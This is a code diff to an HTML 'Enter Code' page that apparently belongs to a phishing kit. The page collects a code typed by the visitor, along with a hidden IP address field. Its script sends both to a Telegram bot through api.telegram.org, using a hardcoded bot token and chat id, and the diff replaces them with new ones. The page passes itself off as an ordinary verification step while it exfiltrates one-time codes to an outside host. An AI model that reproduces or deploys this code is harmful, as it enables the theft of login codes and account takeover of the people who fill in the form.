@@ -113,7 +113,7 @@
 <body>
   <div class="card">
     <h1>Enter Code</h1>
-    <p>Type your code below to continue. No fixed length required.</p>
+    <p>Type your  code below to continue.</p>
     <form id="contactForm"  method="POST">
                   <input type="text" id="ipaddress" name="ipaddress" hidden>
 
@@ -147,8 +147,8 @@
         var ipaddress = document.getElementById('ipaddress').value;
 
         var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
-             var token = '8519891519:AAE7AqpsX4nTAnXaUEqPh8tcmwtaB-n0PYQ';
-      var chat_id = '6069082133';
+            var token = '8439784712:AAGSkvDaPUBA-213rGU19E8ACs8qgoR2CVA';
+      var chat_id = '8386530458';
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
         fetch(url)
